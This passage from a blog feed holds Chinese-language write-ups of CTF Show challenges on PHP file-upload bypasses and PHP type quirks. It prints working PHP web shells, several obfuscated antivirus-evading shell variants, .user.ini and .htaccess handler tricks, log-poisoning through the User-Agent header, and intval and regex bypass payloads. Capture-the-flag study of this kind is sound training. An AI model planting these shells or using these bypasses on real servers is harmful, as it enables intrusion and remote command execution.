alt="image-20210721170131053"></p><p>成功上传</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 111.png&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;</span></span><br></pre></td></tr></table></figure><p>之后访问 <code>/upload/111.png</code> </p><p>蚁剑连接即可</p><h2 id="1-15-Web-168-—-免杀代码"><a href="#1-15-Web-168-—-免杀代码" class="headerlink" title="1.15 Web 168 — 免杀代码"></a>1.15 Web 168 — 免杀代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">基础免杀<span class="comment"># 过滤了 eval , system , $_POST , $_GET 等</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/21/JC5EVDoc8fWKMmG.png" alt="image-20210721170727602"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可使用反引号&lt;?=`ls /var/www/html`?&gt;#flag.php flagaa.php images index.php js layui upload upload.php &lt;?=`cat /var/www/html/flagaa.php`?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其它绕过方式</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php // 使用时请删除此行, 连接密码: TyKPuntU ?&gt;&lt;?php <span class="variable">$bFIY</span>=create_function(chr(25380/705).chr(92115/801).base64_decode(<span class="string">&#x27;bw==&#x27;</span>).base64_decode(<span class="string">&#x27;bQ==&#x27;</span>).base64_decode(<span class="string">&#x27;ZQ==&#x27;</span>),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode(<span class="string">&#x27;YQ==&#x27;</span>).base64_decode(<span class="string">&#x27;bA==&#x27;</span>).chr(060340/01154).chr(01041-0775).base64_decode(<span class="string">&#x27;cw==&#x27;</span>).str_rot13(<span class="string">&#x27;b&#x27;</span>).chr(01504-01327).base64_decode(<span class="string">&#x27;ZQ==&#x27;</span>).chr(057176/01116).chr(0xe3b4/0x3dc));<span class="variable">$bFIY</span>(base64_decode(<span class="string">&#x27;NjgxO&#x27;</span>.<span class="string">&#x27;Tc7QG&#x27;</span>.<span class="string">&#x27;V2QWw&#x27;</span>.<span class="string">&#x27;oJF9Q&#x27;</span>.<span class="string">&#x27;&#x27;</span>.str_rot13(<span class="string">&#x27;G&#x27;</span>).str_rot13(<span class="string">&#x27;1&#x27;</span>).str_rot13(<span class="string">&#x27;A&#x27;</span>).base64_decode(<span class="string">&#x27;VQ==&#x27;</span>).str_rot13(<span class="string">&#x27;J&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(0x304-0x2d3).base64_decode(<span class="string">&#x27;Ug==&#x27;</span>).chr(13197/249).str_rot13(<span class="string">&#x27;F&#x27;</span>).base64_decode(<span class="string">&#x27;MQ==&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;B1bnR&#x27;</span>.<span class="string">&#x27;VXSk7&#x27;</span>.<span class="string">&#x27;MjA0N&#x27;</span>.<span class="string">&#x27;TkxOw&#x27;</span>.<span class="string">&#x27;==&#x27;</span>.<span class="string">&#x27;&#x27;</span>));?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;<span class="variable">$b</span> = explode(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);<span class="variable">$c</span> = <span class="variable">$b</span>[0].<span class="variable">$b</span>[1].<span class="variable">$b</span>[2].<span class="variable">$b</span>[3].<span class="variable">$b</span>[4].<span class="variable">$b</span>[5];<span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[1]);?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=substr(<span class="string">&#x27;1s&#x27;</span>,1).<span class="string">&#x27;ystem&#x27;</span>;<span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[1]);?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=strrev(<span class="string">&#x27;metsys&#x27;</span>);<span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[1]);?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];<span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];<span class="variable">$a</span>(<span class="variable">$b</span>);?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`<span class="variable">$_REQUEST</span>[1]`;?&gt;<span class="comment"># 利用反引号执行系统命令</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;(<span class="variable">$a</span>)(<span class="string">&#x27;ls ../&#x27;</span>);<span class="comment"># 拼接</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$pi</span>=base_convert(37907361743,10,36)(dechex(1598506324));($<span class="variable">$pi</span>&#123;abs&#125;)($<span class="variable">$pi</span>&#123;acos&#125;);<span class="comment"># get传参   abs=system&amp;acos=ls# 数学函数</span></span><br></pre></td></tr></table></figure><h2 id="1-16-Web-169-170-—-日志包含（未过滤-log）"><a href="#1-16-Web-169-170-—-日志包含（未过滤-log）" class="headerlink" title="1.16 Web 169-170 — 日志包含（未过滤 log）"></a>1.16 Web 169-170 — 日志包含（未过滤 log）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">高级免杀</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前端做了 .zip 检查# 后端做了 Content-Type 检查</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/23/aQOvN7gYmnkrzJI.png" alt="image-20210723121849471"></p><p><img src="https://i.loli.net/2021/07/23/Tl6QwvReabhIYEK.png" alt="image-20210723122033455"></p><p>访问 <code>1.php</code> ，我们必须自己上传一个 <code>.php</code> 文件</p><p><img src="https://i.loli.net/2021/07/23/FpgVTBIsjbMiE7P.png" alt="image-20210723122136445"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&#x27;ls ../&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/23/m7yc4khwYu9qO6t.png" alt="image-20210723122412864"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&#x27;cat ../flagaa.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h1 id="二、总结"><a href="#二、总结" class="headerlink" title="二、总结"></a>二、总结</h1><ol><li><p>找到允许上传的文件类型，抓包</p></li><li><p>在 Content-Type 正确的情况下，首先尝试直接更改 后缀为 .php ，写入一句话木马</p></li><li><p>上述不允许的情况下，观察服务器类型，nginx 尝试 .user.ini ，Apache 尝试 .htaccess</p><ul><li>```bash<h1 id="user-iniauto-prepend-file-1-pngauto-prepend-file-testauto-prepend-file-var-log-nginx-access-log"><a href="#user-iniauto-prepend-file-1-pngauto-prepend-file-testauto-prepend-file-var-log-nginx-access-log" class="headerlink" title=".user.iniauto_prepend_file=1.pngauto_prepend_file=testauto_prepend_file=/var/log/nginx/access.log"></a>.user.iniauto_prepend_file=1.pngauto_prepend_file=testauto_prepend_file=/var/log/nginx/access.log</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ ```bash</span><br><span class="line">  # .htaccessAddType application/x-httpd-php .png# 特定文件后缀当作 php 文件处理AddHandler php5-script php # 包含关键字的文件名当作 php 文件处理&lt;FilesMatch &quot;文件名&quot;&gt;# 特定文件名当作 php 文件处理SetHandler application/x-httpd-php&lt;/FilesMatch&gt;SetHandler application/x-httpd-php#所有文件后缀都当作 php 文件处理</span><br></pre></td></tr></table></figure></li></ul></li><li><p>.user.ini 注意该目录下是否已经含有 .php 文件</p></li><li><p>过滤 php </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 大小写绕过# 短标签</span></span><br></pre></td></tr></table></figure><p>过滤 []</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;&#125; 绕过</span></span><br></pre></td></tr></table></figure></li><li><p>过滤 分号 ;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令执行&lt;? system(&quot;nl ../f*&quot;)?&gt;&lt;?=(system(&#x27;nl ../f*&#x27;))?&gt;&lt;?= `nl ../*.p*`?&gt;&lt;?= `nl ../f*`?&gt;&lt;?=(system(&#x27;tac ../f*&#x27;))?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>日志包含 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤 <span class="built_in">log</span>  Web 160<span class="comment"># 上传 .user.iniauto_prepend_file=123.png# 上传 123.png，在其中进行拼接# nginx 服务器&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;# 由于 log 被过滤，进行拼接&lt;?=include&quot;/var/l&quot;.&quot;og/nginx/access.l&quot;.&quot;og&quot;?&gt;# 访问 /upload/index.php 抓包在 User-Agent 中添加恶意代码 &lt;?php system(&#x27;cat ../flag.php&#x27;); ?&gt; ，访问</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">未过滤 <span class="built_in">log</span>  Web 169 170<span class="comment"># 上传 .user.iniauto_prepend_file=/var/log/nginx/access.log# 上传 .php 文件，同时 User-Agent 写入 代码 &lt;?php phpinfo(); ?&gt;&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;内容随意# 访问，命令执行</span></span><br></pre></td></tr></table></figure></li><li><p>.user.ini 上传不了？尝试文件头写入 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure></li><li><p>过滤 <code>.</code>  Web 162-163</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 即不能包含日志文件，则包含 session 文件# 上传 .user.iniGIF89aauto_prepend_file=test# 上传 testGIF89a&lt;?=include&quot;/tmp/sess_test&quot;?&gt;# 构造 POST 数据包&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://e2f78cd5-b2b8-40b9-8104-7dc18214350b.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# 任意上传文件，抓包修改，PHPSESSID=test，写入代码添入变量 Numbers 爆破# 访问 /upload/index.php 添入变量 Numbers 同时爆破</span></span><br></pre></td></tr></table></figure></li><li><p>二次渲染  Web 164 165</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">png 图片<span class="comment"># 脚本生成图片上传，访问，命令执行 &lt;?=$_GET[0]($_POST[1]);?&gt;# 下载至本地查看（文件包含）</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpg 图片<span class="comment"># 直接上传 jpg 图片，下载回来，使用脚本处理，得到新的 jpg 图片，再次上传# 下载至本地查看（文件包含）</span></span><br></pre></td></tr></table></figure></li><li><p>后缀类型不可猜测时，.zip 文件上传 Web 166</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传 .zip 文件抓包 Content-Type: application/x-zip-compressed# 内容直接是恶意代码# 找到 .zip 文件路径，进行查看# 命令执行</span></span><br></pre></td></tr></table></figure></li><li><p>免杀 Web 168</p></li><li><p>前端做后缀检测，后端做不同后缀的 Content-Type 检测</p><p>注意抓包后修改 Content-Type 为白名单</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF Show 文件上传篇。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Show-PHP特性</title>
    <link href="https://xizhi-future.github.io/2021/10/01/CTF-Show-PHP%E7%89%B9%E6%80%A7/"/>
    <id>https://xizhi-future.github.io/2021/10/01/CTF-Show-PHP%E7%89%B9%E6%80%A7/</id>
    <published>2021-10-01T11:15:08.000Z</published>
    <updated>2021-10-01T11:16:09.641Z</updated>
    
    <content type="html"><![CDATA[<p>CTF Show PHP 特性篇。</p><span id="more"></span><h1 id="一、CTF-Show-PHP特性"><a href="#一、CTF-Show-PHP特性" class="headerlink" title="一、CTF Show PHP特性"></a>一、CTF Show PHP特性</h1><h2 id="1-1-Web-89-—-intval-数组-绕过"><a href="#1-1-Web-89-—-intval-数组-绕过" class="headerlink" title="1.1 Web 89 — intval 数组 [ ] 绕过"></a>1.1 Web 89 — intval 数组 [ ] 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1<span class="comment">#数组绕过</span></span><br></pre></td></tr></table></figure><h2 id="1-2-Web-90-—-intval-取整-—-intval-‘4476sasaS’-0-4476"><a href="#1-2-Web-90-—-intval-取整-—-intval-‘4476sasaS’-0-4476" class="headerlink" title="1.2 Web 90 — intval 取整 — intval(‘4476sasaS’,0)===4476"></a>1.2 Web 90 — intval 取整 — intval(‘4476sasaS’,0)===4476</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">intval ( mixed <span class="variable">$var</span> [, int <span class="variable">$base</span> = 10 ] ) : int</span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line">如果 base 是 0，通过检测 var 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 16 进制 (hex)；否则，</span><br><span class="line">如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 8 进制(octal)；</span><br><span class="line">否则，</span><br><span class="line">将使用 10 进制 (decimal)。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">intval(<span class="string">&#x27;4476.0&#x27;</span>)===4476    小数点  </span><br><span class="line">intval(<span class="string">&#x27;+4476.0&#x27;</span>)===4476   正负号</span><br><span class="line">intval(<span class="string">&#x27;4476e0&#x27;</span>)===4476    科学计数法</span><br><span class="line">intval(<span class="string">&#x27;0x117c&#x27;</span>)===4476    16进制</span><br><span class="line">intval(<span class="string">&#x27;010574&#x27;</span>)===4476    8进制</span><br><span class="line">intval(<span class="string">&#x27; 010574&#x27;</span>)===4476   8进制+空格</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(intval(<span class="string">&#x27;4476sasaS&#x27;</span>,0)===4476)&#123;</span><br><span class="line">       <span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=4476asd</span><br></pre></td></tr></table></figure><h2 id="1-3-Web-91-—-正则绕过-—-m-换行匹配"><a href="#1-3-Web-91-—-正则绕过-—-m-换行匹配" class="headerlink" title="1.3 Web 91 — 正则绕过 — /m 换行匹配"></a>1.3 Web 91 — 正则绕过 — /m 换行匹配</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Notice: Undefined index: cmd in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line">nonononono</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解析换行之后要匹配到 php不换行不能匹配到 php</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i 不区分(ignore)大小写m多(more)行匹配若存在换行\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配<span class="variable">$str</span> = <span class="string">&quot;abc\nabc&quot;</span>;<span class="variable">$preg</span> = <span class="string">&quot;/^abc$/m&quot;</span>;preg_match(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。s特殊字符圆点 . 中包含换行符默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符<span class="variable">$str</span> = <span class="string">&quot;abggab\nacbs&quot;</span>;<span class="variable">$preg</span> = <span class="string">&quot;/b./s&quot;</span>;preg_match_all(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);这样匹配到的有三个 <span class="built_in">bg</span> b\n bsA强制从目标字符串开头匹配;D如果使用$限制结尾字符,则不允许结尾有换行; e配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接使用换行符号分割即可# %0a 是 换行符?cmd=%0aphp</span></span><br></pre></td></tr></table></figure><h2 id="1-4-Web-92-—-intval-可解析十六进制、八进制"><a href="#1-4-Web-92-—-intval-可解析十六进制、八进制" class="headerlink" title="1.4 Web 92 — intval 可解析十六进制、八进制"></a>1.4 Web 92 — intval 可解析十六进制、八进制</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=0x117c<span class="comment">#十六进制 Hex?num=010574#八进制 oct?num=%20010574# ?num=4476sqs 不行，由于 $num==4476</span></span><br></pre></td></tr></table></figure><h2 id="1-5-Web-93-—-八进制不含字母，十六进制含字母"><a href="#1-5-Web-93-—-八进制不含字母，十六进制含字母" class="headerlink" title="1.5 Web 93 — 八进制不含字母，十六进制含字母"></a>1.5 Web 93 — 八进制不含字母，十六进制含字母</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=010574<span class="comment">#oct</span></span><br></pre></td></tr></table></figure><h2 id="1-6-Web-94-—-正则绕过-—-20-0a"><a href="#1-6-Web-94-—-正则绕过-—-20-0a" class="headerlink" title="1.6 Web 94 — 正则绕过 — %20  %0a"></a>1.6 Web 94 — 正则绕过 — <code>%20  %0a</code></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0在其中的位置不能是0，即最开始，即不能以0开头?num=%0a010574?num=4476.0?num=%20010574</span></span><br></pre></td></tr></table></figure><h2 id="1-7-Web-95-—-正则绕过"><a href="#1-7-Web-95-—-正则绕过" class="headerlink" title="1.7 Web 95 — 正则绕过"></a>1.7 Web 95 — 正则绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span 